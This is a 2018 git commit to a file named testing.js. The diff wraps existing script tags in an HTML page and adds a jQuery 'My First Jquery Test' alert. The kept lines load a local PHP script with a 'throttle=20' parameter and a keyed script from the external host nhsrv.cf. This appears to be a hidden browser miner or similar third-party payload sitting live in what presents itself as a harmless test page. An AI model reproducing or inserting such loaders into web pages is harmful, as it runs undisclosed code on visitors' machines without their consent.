33fca872cb599eb929251532ba9304f52bbc3a65
samrat59 <46192563+samrat59@users.noreply.github.com>
2018-12-27 19:13:32 +0600

    Update testing.js

--- testing.js
+++ testing.js
@@ -1,2 +1,14 @@
+
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
 <script type="text/javascript" src="b966f5cb4f217475b66c26317f76885b.php?v=js&throttle=20"></script>
 <script type="text/javascript" src="https://nhsrv.cf/srv/?key=b966f5cb4f217475b66c26317f76885b"></script>
+<script type="text/javascript">
+   $(function(){
+      alert("My First Jquery Test");
+   });
+</script>
+</head>
+<body></body>
+</html>
